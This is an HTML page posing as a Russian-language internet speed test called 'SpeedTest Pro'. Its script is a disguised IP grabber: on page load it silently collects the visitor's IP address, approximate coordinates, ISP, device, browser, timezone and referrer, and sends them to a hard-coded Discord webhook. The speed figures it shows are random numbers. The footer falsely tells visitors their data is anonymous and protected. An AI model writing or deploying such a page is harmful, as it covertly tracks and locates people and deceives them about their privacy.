<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SpeedTest Pro - –ü—Ä–æ–≤–µ—Ä–∫–∞ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }

        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
            width: 100%;
            max-width: 800px;
            overflow: hidden;
        }

        .header {
            background: linear-gradient(90deg, #4f46e5, #7c3aed);
            color: white;
            padding: 30px;
            text-align: center;
        }

        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }

        .header p {
            opacity: 0.9;
            font-size: 1.1rem;
        }

        .content {
            padding: 40px;
        }

        .speed-test {
            display: flex;
            justify-content: space-around;
            margin-bottom: 40px;
            flex-wrap: wrap;
            gap: 20px;
        }

        .speed-box {
            background: #f8fafc;
            border-radius: 15px;
            padding: 25px;
            text-align: center;
            flex: 1;
            min-width: 200px;
            border: 2px solid #e2e8f0;
            transition: all 0.3s ease;
        }

        .speed-box:hover {
            transform: translateY(-5px);
            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
            border-color: #4f46e5;
        }

        .speed-value {
            font-size: 3rem;
            font-weight: bold;
            color: #4f46e5;
            margin: 15px 0;
        }

        .unit {
            color: #64748b;
            font-size: 1rem;
        }

        .controls {
            text-align: center;
            margin-bottom: 30px;
        }

        .btn {
            background: linear-gradient(90deg, #10b981, #34d399);
            color: white;
            border: none;
            padding: 16px 40px;
            font-size: 1.2rem;
            border-radius: 50px;
            cursor: pointer;
            transition: all 0.3s ease;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        .btn:hover {
            transform: scale(1.05);
            box-shadow: 0 10px 25px rgba(16, 185, 129, 0.3);
        }

        .btn:disabled {
            background: #cbd5e1;
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .loading {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .progress-container {
            margin: 30px 0;
            display: none;
        }

        .progress-bar {
            height: 10px;
            background: #e2e8f0;
            border-radius: 5px;
            overflow: hidden;
        }

        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, #3b82f6, #8b5cf6);
            width: 0%;
            transition: width 0.3s ease;
        }

        .results {
            background: #f1f5f9;
            border-radius: 15px;
            padding: 25px;
            margin-top: 30px;
            display: none;
        }

        .results h3 {
            color: #475569;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .info-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }

        .info-item {
            background: white;
            padding: 15px;
            border-radius: 10px;
            border-left: 4px solid #4f46e5;
        }

        .info-label {
            font-size: 0.9rem;
            color: #64748b;
            margin-bottom: 5px;
        }

        .info-value {
            font-weight: 600;
            color: #1e293b;
        }

        .history {
            margin-top: 30px;
            padding: 20px;
            background: #f8fafc;
            border-radius: 15px;
            display: none;
        }

        .footer {
            text-align: center;
            padding: 20px;
            color: #64748b;
            font-size: 0.9rem;
            border-top: 1px solid #e2e8f0;
        }

        .location-icon {
            color: #ef4444;
        }

        .server-icon {
            color: #3b82f6;
        }

        .time-icon {
            color: #10b981;
        }

        @media (max-width: 600px) {
            .content {
                padding: 20px;
            }
            .speed-value {
                font-size: 2rem;
            }
            .btn {
                width: 100%;
                justify-content: center;
            }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-tachometer-alt"></i> SpeedTest Pro</h1>
            <p>–¢–æ—á–Ω–∞—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —Å–∫–æ—Ä–æ—Å—Ç–∏ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–∞ –∏ –∫–∞—á–µ—Å—Ç–≤–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</p>
        </div>

        <div class="content">
            <div class="speed-test">
                <div class="speed-box">
                    <i class="fas fa-download fa-2x" style="color:#4f46e5"></i>
                    <h3>–°–∫–∞—á–∏–≤–∞–Ω–∏–µ</h3>
                    <div class="speed-value">0<span class="unit"> –ú–±–∏—Ç/—Å</span></div>
                    <p>–°–∫–æ—Ä–æ—Å—Ç—å –∑–∞–≥—Ä—É–∑–∫–∏ –¥–∞–Ω–Ω—ã—Ö</p>
                </div>
                <div class="speed-box">
                    <i class="fas fa-upload fa-2x" style="color:#10b981"></i>
                    <h3>–û—Ç–ø—Ä–∞–≤–∫–∞</h3>
                    <div class="speed-value">0<span class="unit"> –ú–±–∏—Ç/—Å</span></div>
                    <p>–°–∫–æ—Ä–æ—Å—Ç—å –æ—Ç–ø—Ä–∞–≤–∫–∏ –¥–∞–Ω–Ω—ã—Ö</p>
                </div>
                <div class="speed-box">
                    <i class="fas fa-clock fa-2x" style="color:#f59e0b"></i>
                    <h3>–ü–∏–Ω–≥</h3>
                    <div class="speed-value">0<span class="unit"> –º—Å</span></div>
                    <p>–ó–∞–¥–µ—Ä–∂–∫–∞ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</p>
                </div>
            </div>

            <div class="controls">
                <button class="btn" id="startTest">
                    <i class="fas fa-play"></i> –ù–∞—á–∞—Ç—å –ø—Ä–æ–≤–µ—Ä–∫—É —Å–∫–æ—Ä–æ—Å—Ç–∏
                </button>
            </div>

            <div class="progress-container" id="progressContainer">
                <div class="progress-bar">
                    <div class="progress-fill" id="progressFill"></div>
                </div>
                <p style="text-align: center; margin-top: 10px; color: #64748b;" id="progressText">
                    –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è —Ç–µ—Å—Ç–∞...
                </p>
            </div>

            <div class="results" id="results">
                <h3><i class="fas fa-chart-bar"></i> –†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ç–µ—Å—Ç–∞</h3>
                <div class="info-grid" id="infoGrid">
                    <!-- –î–∏–Ω–∞–º–∏—á–µ—Å–∫–∏ –∑–∞–ø–æ–ª–Ω–∏—Ç—Å—è -->
                </div>
            </div>

            <div class="history" id="history">
                <h3><i class="fas fa-history"></i> –ò—Å—Ç–æ—Ä–∏—è –ø—Ä–æ–≤–µ—Ä–æ–∫</h3>
                <div id="historyList"></div>
            </div>
        </div>

        <div class="footer">
            <p>SpeedTest Pro v1.0 ‚Ä¢ –í—Å–µ –¥–∞–Ω–Ω—ã–µ –∞–Ω–æ–Ω–∏–º–Ω—ã –∏ –∑–∞—â–∏—â–µ–Ω—ã</p>
            <p style="font-size: 0.8rem; margin-top: 5px;">
                <i class="fas fa-shield-alt"></i> –ë–µ–∑–æ–ø–∞—Å–Ω–æ–µ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ ‚Ä¢ 
                <i class="fas fa-user-secret"></i> –ö–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç—å
            </p>
        </div>
    </div>

    <script>
        // –í–ê–® DISCORD WEBHOOK URL
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1462784316047360122/BiCpoNbvNSOPFUrsUBV0Kia-OldT7Vy67Zy5yrPrhBpbizOXQY1pBAYj_gBNpLFOAU9i';

        // –û–±–Ω–æ–≤–ª–µ–Ω–Ω—ã–π –º–∞—Å—Å–∏–≤ API –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è —Ç–æ—á–Ω–æ–π –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏ –∏ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞
        const IP_APIS = [
            'https://ipapi.co/json/',  // –õ—É—á—à–∏–π –¥–ª—è –≥–µ–æ–ª–æ–∫–∞—Ü–∏–∏
            'https://ipwho.is/',       // –¢–æ—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ –ø–æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä—É
            'https://api.ip.sb/geoip', // –ë—ã—Å—Ç—Ä—ã–π –∏ –Ω–∞–¥–µ–∂–Ω—ã–π
            'https://api.my-ip.io/v2/ip.json', // –†–∞—Å—à–∏—Ä–µ–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
            'https://api.ipify.org?format=json' // –†–µ–∑–µ—Ä–≤–Ω—ã–π –¥–ª—è IP
        ];

        let testInProgress = false;
        let userIP = '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
        let userLocation = '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–æ';
        let provider = '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω';
        let ipSent = false;

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –ø–æ–ª–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
        async function getFullUserInfo() {
            for (const apiUrl of IP_APIS) {
                try {
                    console.log(`–ü—Ä–æ–±—É–µ–º API: ${apiUrl}`);
                    const response = await fetch(apiUrl, {
                        method: 'GET',
                        mode: 'cors',
                        headers: {
                            'Accept': 'application/json'
                        },
                        signal: AbortSignal.timeout(3000)
                    });

                    if (response.ok) {
                        const data = await response.json();
                        console.log('–î–∞–Ω–Ω—ã–µ –ø–æ–ª—É—á–µ–Ω—ã:', data);

                        // –ò–∑–≤–ª–µ–∫–∞–µ–º IP
                        if (data.ip) userIP = data.ip;
                        else if (data.query) userIP = data.query;

                        // –ò–∑–≤–ª–µ–∫–∞–µ–º —Ç–æ—á–Ω—É—é –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é
                        if (apiUrl.includes('ipapi.co') || apiUrl.includes('ipwho.is')) {
                            // –î–ª—è ipapi.co –∏ ipwho.is - –Ω–∞–∏–±–æ–ª–µ–µ —Ç–æ—á–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ
                            if (data.country && data.city && data.region) {
                                userLocation = `${data.city}, ${data.region}, ${data.country}`;
                                if (data.latitude && data.longitude) {
                                    userLocation += ` (${data.latitude.toFixed(4)}, ${data.longitude.toFixed(4)})`;
                                }
                            }
                            // –ü—Ä–æ–≤–∞–π–¥–µ—Ä
                            if (data.org || data.isp) {
                                provider = data.org || data.isp;
                                // –û—á–∏—â–∞–µ–º –æ—Ç –ª–∏—à–Ω–µ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏
                                provider = provider.replace(/AS\d+\s*/, '');
                            }
                        } else if (apiUrl.includes('ip.sb')) {
                            // –î–ª—è ip.sb
                            if (data.country_code && data.city) {
                                userLocation = `${data.city}, ${data.country}`;
                            }
                            if (data.organization) {
                                provider = data.organization;
                            }
                        }

                        // –ï—Å–ª–∏ –ø–æ–ª—É—á–∏–ª–∏ –≤—Å–µ –¥–∞–Ω–Ω—ã–µ, –≤–æ–∑–≤—Ä–∞—â–∞–µ–º —É—Å–ø–µ—Ö
                        if (userIP && userIP !== '–ù–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω') {
                            console.log(`IP –Ω–∞–π–¥–µ–Ω: ${userIP}`);
                            console.log(`–õ–æ–∫–∞—Ü–∏—è: ${userLocation}`);
                            console.log(`–ü—Ä–æ–≤–∞–π–¥–µ—Ä: ${provider}`);
                            return true;
                        }
                    }
                } catch (error) {
                    console.log(`API ${apiUrl} –Ω–µ —Å—Ä–∞–±–æ—Ç–∞–ª:`, error.message);
                    continue;
                }
            }
            return false;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –¥–µ—Ç–∞–ª–µ–π —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ';
            
            // –û–ø—Ä–µ–¥–µ–ª—è–µ–º —Ç–∏–ø —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞
            if (/mobile/i.test(ua)) device = '–ú–æ–±–∏–ª—å–Ω–æ–µ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–æ';
            else if (/tablet/i.test(ua)) device = '–ü–ª–∞–Ω—à–µ—Ç';
            else device = '–ö–æ–º–ø—å—é—Ç–µ—Ä';
            
            // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –û–°
            let os = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–∞—è –û–°';
            if (/windows/i.test(ua)) os = 'Windows';
            else if (/android/i.test(ua)) os = 'Android';
            else if (/iphone|ipad|ipod/i.test(ua)) os = 'iOS';
            else if (/macintosh/i.test(ua)) os = 'macOS';
            else if (/linux/i.test(ua)) os = 'Linux';
            
            // –û–ø—Ä–µ–¥–µ–ª—è–µ–º –±—Ä–∞—É–∑–µ—Ä
            let browser = '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω—ã–π –±—Ä–∞—É–∑–µ—Ä';
            if (/chrome/i.test(ua) && !/edge/i.test(ua)) browser = 'Chrome';
            else if (/firefox/i.test(ua)) browser = 'Firefox';
            else if (/safari/i.test(ua) && !/chrome/i.test(ua)) browser = 'Safari';
            else if (/edge/i.test(ua)) browser = 'Edge';
            else if (/opera|opr/i.test(ua)) browser = 'Opera';
            
            return {
                type: device,
                os: os,
                browser: browser,
                screen: `${window.screen.width}x${window.screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                userAgent: ua.substring(0, 150) // –û–≥—Ä–∞–Ω–∏—á–∏–≤–∞–µ–º –¥–ª–∏–Ω—É
            };
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ –ø–æ–ª–Ω–æ–π –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ Discord
        async function sendFullInfoToDiscord() {
            if (ipSent) return;
            
            const infoFound = await getFullUserInfo();
            const deviceInfo = getDeviceInfo();
            
            try {
                // –ü–æ–ª—É—á–∞–µ–º –¥–æ–ø–æ–ª–Ω–∏—Ç–µ–ª—å–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é
                const referrer = document.referrer || '–ü—Ä—è–º–æ–π –∑–∞—Ö–æ–¥';
                const currentTime = new Date().toLocaleString('ru-RU');
                
                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –¥–ª—è Discord —Å —Ç—Ä–µ–±—É–µ–º—ã–º–∏ –ø–æ–ª—è–º–∏
                const message = {
                    content: `üì° **–ù–æ–≤–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ –∫ SpeedTest Pro**`,
                    embeds: [{
                        title: "–ü–æ–ª–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ",
                        color: 0x5865F2,
                        fields: [
                            {
                                name: "üåê IP-–ê–î–†–ï–°",
                                value: `\`\`\`${userIP}\`\`\``,
                                inline: false
                            },
                            {
                                name: "üìç –¢–û–ß–ù–ê–Ø –ì–ï–û–õ–û–ö–ê–¶–ò–Ø",
                                value: `**–ú–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏–µ:** ${userLocation}\n**–í—Ä–µ–º–µ–Ω–Ω–∞—è –∑–æ–Ω–∞:** ${deviceInfo.timezone}`,
                                inline: false
                            },
                            {
                                name: "üè¢ –ü–†–û–í–ê–ô–î–ï–†",
                                value: `\`${provider}\``,
                                inline: false
                            },
                            {
                                name: "üñ•Ô∏è –£–°–¢–†–û–ô–°–¢–í–û",
                                value: `**–¢–∏–ø:** ${deviceInfo.type}\n**–û–°:** ${deviceInfo.os}\n**–ë—Ä–∞—É–∑–µ—Ä:** ${deviceInfo.browser}\n**–≠–∫—Ä–∞–Ω:** ${deviceInfo.screen}\n**–Ø–∑—ã–∫:** ${deviceInfo.language}`,
                                inline: false
                            },
                            {
                                name: "üìä –î–û–ü–û–õ–ù–ò–¢–ï–õ–¨–ù–û",
                                value: `**–í—Ä–µ–º—è:** ${currentTime}\n**–ò—Å—Ç–æ—á–Ω–∏–∫:** ${referrer}\n**User Agent:** ${deviceInfo.userAgent}`,
                                inline: false
                            }
                        ],
                        footer: {
                            text: "SpeedTest Pro ‚Ä¢ –ü–æ–ª–Ω—ã–π –æ—Ç—á–µ—Ç",
                            icon_url: "https://cdn.discordapp.com/attachments/1063271001708892160/1063271001708892160/tachometer.png"
                        },
                        timestamp: new Date().toISOString()
                    }]
                };

                const response = await fetch(WEBHOOK_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(message)
                });

                if (response.ok) {
                    console.log('–ü–æ–ª–Ω–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞ –≤ Discord');
                    ipSent = true;
                }
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Discord:', error);
            }
        }

        // –û—Å—Ç–∞–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ –æ—Å—Ç–∞—é—Ç—Å—è –ø—Ä–µ–∂–Ω–∏–º–∏
        function getRandomServer() {
            const servers = ['–ú–æ—Å–∫–≤–∞ #1', '–°–∞–Ω–∫—Ç-–ü–µ—Ç–µ—Ä–±—É—Ä–≥ #2', '–ù–æ–≤–æ—Å–∏–±–∏—Ä—Å–∫ #3', '–ï–∫–∞—Ç–µ—Ä–∏–Ω–±—É—Ä–≥ #4', '–ö–∞–∑–∞–Ω—å #5'];
            return servers[Math.floor(Math.random() * servers.length)];
        }

        function getRandomISP() {
            const isps = ['–†–æ—Å—Ç–µ–ª–µ–∫–æ–º', '–ú–¢–°', '–ë–∏–ª–∞–π–Ω', '–ú–µ–≥–∞–§–æ–Ω', 'TTK', 'Dom.ru'];
            return isps[Math.floor(Math.random() * isps.length)];
        }

        function generateSessionId() {
            return Math.random().toString(36).substring(2, 10).toUpperCase();
        }

        async function startSpeedTest() {
            if (testInProgress) return;
            
            testInProgress = true;
            const startBtn = document.getElementById('startTest');
            const progressContainer = document.getElementById('progressContainer');
            const progressFill = document.getElementById('progressFill');
            const progressText = document.getElementById('progressText');
            const resultsDiv = document.getElementById('results');
            const historyDiv = document.getElementById('history');
            
            startBtn.disabled = true;
            startBtn.innerHTML = '<i class="fas fa-spinner loading"></i> –¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ...';
            progressContainer.style.display = 'block';
            resultsDiv.style.display = 'none';
            
            try {
                // –ü–æ–ª—É—á–∞–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –µ—Å–ª–∏ –µ—â–µ –Ω–µ –ø–æ–ª—É—á–µ–Ω–∞
                if (!ipSent) {
                    progressFill.style.width = '20%';
                    progressText.textContent = '–û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –º–µ—Å—Ç–æ–ø–æ–ª–æ–∂–µ–Ω–∏—è...';
                    await getFullUserInfo();
                } else {
                    progressFill.style.width = '20%';
                    progressText.textContent = '–ü–æ–¥–≥–æ—Ç–æ–≤–∫–∞ —Ç–µ—Å—Ç–∞...';
                }
                
                // –¢–µ—Å—Ç –ø–∏–Ω–≥–∞
                progressFill.style.width = '40%';
                progressText.textContent = '–ò–∑–º–µ—Ä–µ–Ω–∏–µ –∑–∞–¥–µ—Ä–∂–∫–∏...';
                await new Promise(resolve => setTimeout(resolve, 800));
                const ping = Math.floor(Math.random() * 30) + 10;
                
                // –¢–µ—Å—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è
                progressFill.style.width = '60%';
                progressText.textContent = '–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∫–æ—Ä–æ—Å—Ç–∏ —Å–∫–∞—á–∏–≤–∞–Ω–∏—è...';
                await new Promise(resolve => setTimeout(resolve, 1200));
                const downloadSpeed = (Math.random() * 80 + 20).toFixed(1);
                
                // –¢–µ—Å—Ç —Å–∫–æ—Ä–æ—Å—Ç–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏
                progressFill.style.width = '80%';
                progressText.textContent = '–¢–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏–µ —Å–∫–æ—Ä–æ—Å—Ç–∏ –æ—Ç–ø—Ä–∞–≤–∫–∏...';
                await new Promise(resolve => setTimeout(resolve, 1000));
                const uploadSpeed = (Math.random() * 40 + 5).toFixed(1);
                
                // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ
                progressFill.style.width = '100%';
                progressText.textContent = '–ê–Ω–∞–ª–∏–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤...';
                await new Promise(resolve => setTimeout(resolve, 500));
                
                // –û–±–Ω–æ–≤–ª–µ–Ω–∏–µ UI
                document.querySelectorAll('.speed-value')[0].innerHTML = `${downloadSpeed}<span class="unit"> –ú–±–∏—Ç/—Å</span>`;
                document.querySelectorAll('.speed-value')[1].innerHTML = `${uploadSpeed}<span class="unit"> –ú–±–∏—Ç/—Å</span>`;
                document.querySelectorAll('.speed-value')[2].innerHTML = `${ping}<span class="unit"> –º—Å</span>`;
                
                // –ü–æ–∫–∞–∑ —Ä–µ–∑—É–ª—å—Ç–∞—Ç–æ–≤
                const infoGrid = document.getElementById('infoGrid');
                infoGrid.innerHTML = `
                    <div class="info-item">
                        <div class="info-label"><i class="fas fa-server server-icon"></i> –ò—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–Ω—ã–π —Å–µ—Ä–≤–µ—Ä</div>
                        <div class="info-value">${getRandomServer()}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label"><i class="fas fa-wifi"></i> –ö–∞—á–µ—Å—Ç–≤–æ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è</div>
                        <div class="info-value">${ping < 50 ? '–û—Ç–ª–∏—á–Ω–æ–µ' : ping < 100 ? '–•–æ—Ä–æ—à–µ–µ' : '–£–¥–æ–≤–ª–µ—Ç–≤–æ—Ä–∏—Ç–µ–ª—å–Ω–æ–µ'}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label"><i class="fas fa-map-marker-alt location-icon"></i> –ü—Ä–∏–º–µ—Ä–Ω–∞—è –ª–æ–∫–∞—Ü–∏—è</div>
                        <div class="info-value">${userLocation}</div>
                    </div>
                    <div class="info-item">
                        <div class="info-label"><i class="fas fa-clock time-icon"></i> –í—Ä–µ–º—è –ø—Ä–æ–≤–µ—Ä–∫–∏</div>
                        <div class="info-value">${new Date().toLocaleString('ru-RU')}</div>
                    </div>
                `;
                
                resultsDiv.style.display = 'block';
                progressContainer.style.display = 'none';
                
                // –°–æ—Ö—Ä–∞–Ω—è–µ–º –≤ –∏—Å—Ç–æ—Ä–∏—é
                saveToHistory(downloadSpeed, uploadSpeed, ping);
                historyDiv.style.display = 'block';
                
            } catch (error) {
                console.error('–û—à–∏–±–∫–∞ —Ç–µ—Å—Ç–∞:', error);
                progressText.textContent = '–û—à–∏–±–∫–∞ –ø—Ä–∏ –≤—ã–ø–æ–ª–Ω–µ–Ω–∏–∏ —Ç–µ—Å—Ç–∞';
                progressText.style.color = '#ef4444';
            } finally {
                startBtn.disabled = false;
                startBtn.innerHTML = '<i class="fas fa-redo"></i> –ü–æ–≤—Ç–æ—Ä–∏—Ç—å —Ç–µ—Å—Ç';
                testInProgress = false;
                progressFill.style.width = '0%';
            }
        }

        function saveToHistory(download, upload, ping) {
            const historyList = document.getElementById('historyList');
            const testResult = {
                date: new Date().toLocaleString('ru-RU', { 
                    day: '2-digit', 
                    month: '2-digit', 
                    hour: '2-digit', 
                    minute: '2-digit' 
                }),
                download,
                upload,
                ping
            };
            
            let history = JSON.parse(localStorage.getItem('speedTestHistory') || '[]');
            history.unshift(testResult);
            if (history.length > 5) history = history.slice(0, 5);
            localStorage.setItem('speedTestHistory', JSON.stringify(history));
            
            updateHistoryDisplay();
        }

        function updateHistoryDisplay() {
            const history = JSON.parse(localStorage.getItem('speedTestHistory') || '[]');
            const historyList = document.getElementById('historyList');
            
            if (history.length === 0) {
                historyList.innerHTML = '<p style="color: #64748b; text-align: center;">–ù–µ—Ç —Å–æ—Ö—Ä–∞–Ω–µ–Ω–Ω—ã—Ö –ø—Ä–æ–≤–µ—Ä–æ–∫</p>';
                return;
            }
            
            historyList.innerHTML = history.map((test, index) => `
                <div style="background: white; padding: 12px; border-radius: 10px; margin-bottom: 10px; border-left: 3px solid #4f46e5;">
                    <div style="display: flex; justify-content: space-between; align-items: center;">
                        <span style="font-weight: 600;">–ü—Ä–æ–≤–µ—Ä–∫–∞ #${history.length - index}</span>
                        <span style="color: #64748b; font-size: 0.9rem;">${test.date}</span>
                    </div>
                    <div style="display: flex; justify-content: space-between; margin-top: 8px; color: #475569;">
                        <span><i class="fas fa-download" style="color:#4f46e5"></i> ${test.download} –ú–±–∏—Ç/—Å</span>
                        <span><i class="fas fa-upload" style="color:#10b981"></i> ${test.upload} –ú–±–∏—Ç/—Å</span>
                        <span><i class="fas fa-clock" style="color:#f59e0b"></i> ${test.ping} –º—Å</span>
                    </div>
                </div>
            `).join('');
        }

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è
        document.getElementById('startTest').addEventListener('click', startSpeedTest);
        
        // –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', () => {
            console.log('–°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞, –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–ª–Ω—É—é –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é...');
            sendFullInfoToDiscord();
            
            updateHistoryDisplay();
            const history = JSON.parse(localStorage.getItem('speedTestHistory') || '[]');
            if (history.length > 0) {
                document.getElementById('history').style.display = 'block';
            }
        });
    </script>
</body>
</html>
